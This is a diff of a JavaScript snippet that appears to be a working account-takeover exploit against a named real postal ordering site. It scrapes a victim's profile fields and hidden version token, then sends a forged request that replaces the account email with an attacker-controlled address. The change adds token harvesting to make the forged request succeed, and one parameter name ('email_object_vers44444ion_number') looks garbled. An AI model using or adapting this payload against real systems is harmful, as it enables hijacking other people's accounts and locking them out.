@@ -23,6 +23,7 @@ xhr.onreadystatechange = function () {
             const o_middle_name =  doc.querySelector('input[name="o_middle_name"]')?.value || null;  
             const o_last_name =  doc.querySelector('input[name="o_last_name"]')?.value || null;  
             const username =  doc.querySelector('input[id="username"]')?.value || null;
+            const email_object_version_number =  doc.querySelector('input[id="email_object_version_number"]')?.value || null;
             const newemail = "attacker.email123@gmail.com";// Enter new email
             const img = new Image();
 
@@ -42,7 +43,7 @@ img.onerror = function () {
     finish();
 };
 
-img.src = `https://eordre.posten.no/OA_HTML/xxcu_ibeCAcdPersonalInfo_NBFV.jsp?submit.x=&ibempf=0:0:0&first_name=${o_first_name}&o_first_name=${o_first_name}&middle_name=${o_middle_name}&o_middle_name=${o_middle_name}&last_name=${o_last_name}&o_last_name=${o_last_name}&object_version_number=14&email_address=${newemail}&o_email_address=${emailAddress}&email_contact_point_id=${emailContactPointId}&email_object_vers44444ion_number=&password=&vpassword=`;
+img.src = `https://eordre.posten.no/OA_HTML/xxcu_ibeCAcdPersonalInfo_NBFV.jsp?submit.x=&ibempf=0:0:0&first_name=${o_first_name}&o_first_name=${o_first_name}&middle_name=${o_middle_name}&o_middle_name=${o_middle_name}&last_name=${o_last_name}&o_last_name=${o_last_name}&object_version_number=14&email_address=${newemail}&o_email_address=${emailAddress}&email_contact_point_id=${emailContactPointId}&email_object_vers44444ion_number=&password=&vpassword=&email_object_version_number=${email_object_version_number}`;
         } else {
 
             console.error(
